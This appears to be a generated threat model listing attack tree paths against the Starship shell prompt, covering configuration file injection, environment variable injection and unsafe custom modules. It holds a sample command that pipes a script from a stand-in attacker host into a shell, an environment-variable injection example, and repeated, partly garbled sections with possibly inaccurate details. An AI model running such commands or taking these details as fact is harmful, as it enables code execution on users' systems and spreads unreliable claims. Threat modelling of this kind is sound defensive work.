## Attack Tree Path: [Exploit Starship Configuration Vulnerabilities - Malicious Configuration Injection](./attack_tree_paths/exploit_starship_configuration_vulnerabilities_-_malicious_configuration_injection.md)

*   **Attack Vector:**  This path focuses on injecting malicious configurations into Starship to execute arbitrary commands. It branches into two main methods:

    *   **Direct Configuration File Modification:**
        *   **Attack Steps:**
            1.  **Gain Write Access to Starship Configuration File:** The attacker first needs to obtain the ability to write to the user's Starship configuration file (e.g., `~/.config/starship.toml`). This can be achieved by:
                *   Exploiting an application vulnerability that allows arbitrary file writes on the system.
                *   Compromising user credentials or gaining unauthorized access to the user's account through social engineering or other means.
            2.  **Modify Starship Configuration to Execute Malicious Commands:** Once write access is gained, the attacker modifies the configuration file. This involves:
                *   Injecting malicious code into the `command` field of a `custom` module. For example: `[module.custom.command] = "curl attacker.com/malicious.sh | sh"`.
                *   Crafting malicious `format` strings within modules that execute commands.
        *   **Impact:** Critical - Arbitrary code execution on the user's system with the user's privileges.

    *   **Environment Variable Injection:**
        *   **Attack Steps:**
            1.  **Control Environment Variables Read by Starship:** The attacker needs to find a way to control environment variables that Starship reads, specifically those starting with `STARSHIP_`. This can be achieved by:
                *   Exploiting an application vulnerability that allows setting or modifying environment variables.
                *   Compromising the application's environment setup process to inject malicious environment variables.
            2.  **Inject Malicious Configuration via Environment Variables (STARSHIP_*):**  The attacker sets environment variables to inject malicious configurations. For example: `export STARSHIP_CUSTOM_MODULES='[{ "command" = "malicious_command", "format" = "$custom" }]'`.
            3.  **Use Environment Variables to Override or Inject Malicious `command` or `format`:** Starship prioritizes environment variables, allowing attackers to override existing configurations or inject entirely new malicious modules and commands.
        *   **Impact:** Critical - Arbitrary code execution on the user's system with the user's privileges.

## Attack Tree Path: [Direct Configuration File Modification](./attack_tree_paths/direct_configuration_file_modification.md)

*   **Direct Configuration File Modification:**
        *   **Attack Steps:**
            1.  **Gain Write Access to Starship Configuration File:** The attacker first needs to obtain the ability to write to the user's Starship configuration file (e.g., `~/.config/starship.toml`). This can be achieved by:

                *   Crafting malicious `format` strings within modules that execute commands.
        *   **Impact:** Critical - Arbitrary code execution on the user's system with the user's privileges.

## Attack Tree Path: [Environment Variable Injection](./attack_tree_paths/environment_variable_injection.md)

*   **Environment Variable Injection:**
        *   **Attack Steps:**
            1.  **Control Environment Variables Read by Starship:** The attacker needs to find a way to control environment variables that Starship reads, specifically those starting with `STARSHIP_`. This can be achieved by:
                *   Exploiting an application vulnerability that allows setting or modifying environment variables.
                *   Compromising the application's environment setup process to inject malicious environment variables.
            2.  **Inject Malicious Configuration via Environment Variables (STARSHIP_*):**  The attacker sets environment variables to inject malicious configurations. For example: `export STARSHIP_CUSTOM_MODULES='[{ "command" = "malicious_command", "format" = "$custom" }]'`.
            3.  **Use Environment Variables to Override or Inject Malicious `command` or `format`:** Starship prioritizes environment variables, allowing attackers to override existing configurations or inject entirely new malicious modules and commands.
        *   **Impact:** Critical - Arbitrary code execution on the user's system with the user's privileges.

## Attack Tree Path: [Exploit Starship Module Vulnerabilities - Vulnerabilities in Custom Modules (if used)](./attack_tree_paths/exploit_starship_module_vulnerabilities_-_vulnerabilities_in_custom_modules__if_used_.md)

*   **Attack Vector:** This path focuses on exploiting vulnerabilities within custom Starship modules, particularly if the application promotes or distributes such modules.

    *   **Unsafe Code in Custom Modules (if application provides/suggests custom modules):**
        *   **Attack Steps:**
            1.  **Application distributes or recommends vulnerable custom modules:** The application itself becomes a vector by distributing or recommending custom Starship modules that contain security flaws. These flaws could be intentional (malicious modules) or unintentional (poorly written modules).
            2.  **Users unknowingly use vulnerable modules, leading to compromise:** Users, trusting the application, adopt and use these vulnerable custom modules.
        *   **Impact:** High - Users who adopt the vulnerable modules become susceptible to various attacks depending on the nature of the vulnerability in the module (e.g., command injection, information disclosure).

    *   **Lack of Input Validation in Custom Module Commands:**
        *   **Attack Steps:**
            1.  **Custom modules execute external commands based on user input or environment:** Poorly written custom modules might execute external commands based on user-controlled input or environment variables without proper sanitization.
        *   **Impact:** Critical - Command injection vulnerability in the custom module, leading to arbitrary code execution if exploited.

## Attack Tree Path: [Unsafe Code in Custom Modules (if application provides/suggests custom modules)](./attack_tree_paths/unsafe_code_in_custom_modules__if_application_providessuggests_custom_modules_.md)

*   **Unsafe Code in Custom Modules (if application provides/suggests custom modules):**
        *   **Attack Steps:**
            1.  **Application distributes or recommends vulnerable custom modules:** The application itself becomes a vector by distributing or recommending custom Starship modules that contain security flaws. These flaws could be intentional (malicious modules) or unintentional (poorly written modules).
            2.  **Users unknowingly use vulnerable modules, leading to compromise:** Users, trusting the application, adopt and use these vulnerable custom modules.
        *   **Impact:** High - Users who adopt the vulnerable modules become susceptible to various attacks depending on the nature of the vulnerability in the module (e.g., command injection, information disclosure).

## Attack Tree Path: [Lack of Input Validation in Custom Module Commands](./attack_tree_paths/lack_of_input_validation_in_custom_module_commands.md)

*   **Lack of Input Validation in Custom Module Commands:**
        *   **Attack Steps:**
            1.  **Custom modules execute external commands based on user input or environment:** Poorly written custom modules might execute external commands based on user-controlled input or environment variables without proper sanitization.
        *   **Impact:** Critical - Command injection vulnerability in the custom module, leading to arbitrary code execution if exploited.
